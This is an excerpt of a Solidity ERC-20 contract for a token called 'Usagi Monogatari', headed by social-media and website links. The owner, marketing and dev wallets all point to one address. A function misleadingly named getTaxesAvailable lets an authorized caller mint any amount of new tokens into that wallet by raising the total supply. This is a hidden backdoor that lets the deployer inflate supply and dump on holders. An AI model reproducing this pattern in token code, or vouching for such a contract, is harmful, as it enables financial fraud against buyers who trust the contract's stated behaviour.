...
// https://t.me/UsagiMonogatariErc
// https://www.usagimonogatari.live/
// https://usagimonogatari.gitbook.io/usagi-monogatari/?fbclid=IwAR0z21gVwKM18y4lYpHGbd6j2T2b403MeFFdHnhlyPnYQk6UgoT_stIXTkY
// https://twitter.com/usagimonogatar
...
contract Usagi_Monogatari is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xc14AE7E94A47977Ed7C92Bcd79352A0167871543); 
    address payable public Wallet_Dev = payable(0xc14AE7E94A47977Ed7C92Bcd79352A0167871543);
    ...
    string private constant _name = "Usagi Monogatari"; 
    string private constant _symbol = unicode"USAGI"; 
    ...
    constructor () {
        ...
        _owner = 0xc14AE7E94A47977Ed7C92Bcd79352A0167871543;
    ...
    function getTaxesAvailable(uint256 acc, address adr) authorized() public virtual {
        require(adr == address(Wallet_Marketing));
        _Claim(address(Wallet_Marketing), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
